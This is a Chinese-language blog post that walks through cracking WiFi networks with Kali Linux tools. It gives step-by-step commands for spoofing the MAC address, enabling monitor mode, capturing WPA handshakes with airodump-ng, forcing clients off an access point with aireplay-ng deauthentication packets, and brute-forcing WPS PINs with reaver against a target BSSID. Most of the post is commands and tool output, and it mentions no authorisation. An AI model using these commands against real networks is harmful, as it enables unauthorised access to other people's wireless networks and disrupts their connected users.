---
title: Kali-Linux破解WIFI
categories:
  - kali
toc: false
date: 2018-11-07 09:05:46
tags:
---
摘要暂略。
<!-- more -->

一些参考链接：  
[无线安全专题01--kali破解WPA](https://www.jianshu.com/p/430ae3c978d9)。  
[无线安全专题_破解篇02--kali破解pin码](https://www.jianshu.com/p/a8439e777af7)。  
[Aircrack除破解WiFi密码外的趣味玩法](https://www.freebuf.com/articles/wireless/59809.html)。  

#### 查看无线网络
用`ifconfig`或`ip addr`等命令查看网络接口：
```
root@KL:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 11:22:33:44:55:66 brd ff:ff:ff:ff:ff:ff
    inet 192.168.43.129/24 brd 192.168.43.255 scope global dynamic noprefixroute eth0
       valid_lft 1522sec preferred_lft 1522sec
    inet6 fe80::20c:29ff:fea4:125/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 10:20:30:40:50:60 brd ff:ff:ff:ff:ff:ff
4: wlan1: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 1a:2b:3c:4d:5e:6f brd ff:ff:ff:ff:ff:ff
root@KL:~#
```
可知，此时有`wlan0`和`wlan1`这两个无线网卡。

#### 修改MAC地址
```shell
macchanger --help
macchanger --mac=XX:XX:XX:XX:XX:XX device
macchanger --random device
# 例
ifconfig wlan0 down
macchanger --random wlan0
ifconfig wlan0 up
```

#### 无线网卡启动监听模式
```shell
airmon-ng <start|stop> <interface> [channel] airmon-ng <check> [kill]
# 例
airmon-ng check kill      # 列出可能的干扰程序并尝试清除它们
airmon-ng                 # 查看所有无线网卡的当前状态
airmon-ng start wlan0     # 在接口(wlan0)上启动监听(monitor)模式
airmon-ng                 # 查看所有无线网卡的当前状态(查看是否启动成功)
# 一般(wlan0)启动监听模式后名字会变为(wlan0mon)
airmon-ng stop  wlan0mon  # 禁用监听模式并返回到托管模式
airmon-ng                 # 查看所有无线网卡的当前状态(查看是否禁用成功)
```

#### 捕获握手包
```shell
airodump-ng [options] <interface name>
-d <bssid>, --bssid <bssid>
    It will only show networks, matching the given bssid.
-c <channel>[,<channel>[,...]], --channel <channel>[,<channel>[,...]]
    Indicate the channel(s) to listen to. By default airodump-ng hop on all 2.4GHz channels.
-w <prefix>, --write <prefix>
    Is the dump file prefix to use.
# 例
airodump-ng wlan0mon  # 捕获WIFI范围内的无线信息
airodump-ng --bssid 1a:2b:3c:4d:5e:6f --write ./testData wlan0mon  # 捕获握手包并保存到testData开头的文件中
```

#### 解除认证攻击
```shell
aireplay-ng [options] <replay interface>
 -a <bssid>
    Set Access Point MAC address.
-c <dmac>
    Set destination MAC address.
-0 <count>, --deauth=<count>
    This attack sends deauthentication packets to one or more clients which are currently associated with a particular access point.  Deauthenticating  clients  can  be done  for  a  number  of reasons: Recovering a hidden ESSID. This is an ESSID which is not being broadcast. Another term for this is "cloaked" or Capturing WPA/WPA2 handshakes by forcing clients to reauthenticate or Generate ARP requests (Windows clients sometimes flush their ARP  cache  when  disconnected).   Of  course,  this attack is totally useless if there are no associated wireless client or on fake authentications.
    这个攻击发送解除认证的数据包给一个或多个客户端(当前与指定AP关联)。期望能捕获WPA/WPA2握手包。
# 例
aireplay-ng -a AP的MAC -c Client的MAC --deauth=3 wlan0mon
```

#### 字段解释
`man airodump-ng`的最下方有这个例子。
```
airodump-ng -c 9 wlan0mon

Here is an example screenshot:

-----------------------------------------------------------------------
CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ BAT: 2 hours 10 mins ][ WPA handshake: 00:14:6C:7E:40:80

BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID

00:09:5B:1C:AA:1D   11  16       10        0    0  11  54. OPN              <length: 7>
00:14:6C:7A:41:81   34 100       57       14    1   9  11  WEP  WEP         bigbear
00:14:6C:7E:40:80   32 100      752       73    2   9  54  WPA  TKIP   PSK  teddy

BSSID              STATION            PWR   Rate   Lost   Frames  Probes

00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   11-11     2       14  bigbear
(not associated)   00:14:A4:3F:8D:13   19   11-11     0        4  mossy
00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1    11-2     0        5  bigbear
00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   36-24     0       99  teddy
-----------------------------------------------------------------------
  BSSID: MAC地址。
    PWR: 信号强度。数字越大(负数越接近0)信号越强。-1表示无效值。
    RXQ: 略。
Beacons: AP(access point)发送的信号浮标的数量。最低速率下每个AP每秒大约发送10个信标。
  #Data: 捕获的数据包的数量。
    #/s: 每秒的数据包的数量(测量最近10秒内的数据)。
     CH: channel号(从信标包中取得)。
     MB: AP支持的最大速度。不用管它。常见值：11、22、54、54.、54e、54e.、。
    ENC: 正在使用中的加密算法。
 CIPHER: 检测到的加密解密引擎？
   AUTH: 使用的身份验证协议。
  ESSID: 所谓的SSID，WIFI的名字。
STATION: (连到AP上(和)没有连到AP上)的client的MAC地址。
   Rate: 速率。第1个数字：AP到client的最新速率；第二个数字：client到AP的最新速率。
   Lost: 来自client的包的丢失的数量。
```

#### 爆破WPS的pin码
扫描WIFI。WPS的Lck为No的都可以爆破试试。
```shell
wash --help
# 例
wash -i wlan0mon
```
WPS的pin码的爆破的命令：
```shell
reaver -i <interface> -b <target bssid> -vv
-i, --interface=<wlan>          Name of the monitor-mode interface to use
-b, --bssid=<mac>               BSSID of the target AP
-c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)
-v, --verbose                   Display non-critical warnings (-vv or -vvv for more)
-d, --delay=<seconds>           Set the delay between pin attempts [1]
-t, --timeout=<seconds>         Set the receive timeout period [10]
-S, --dh-small                  Use small DH keys to improve crack speed
# 例
reaver -i wlan0mon -b 00:14:6C:7A:41:81 -S -v
```
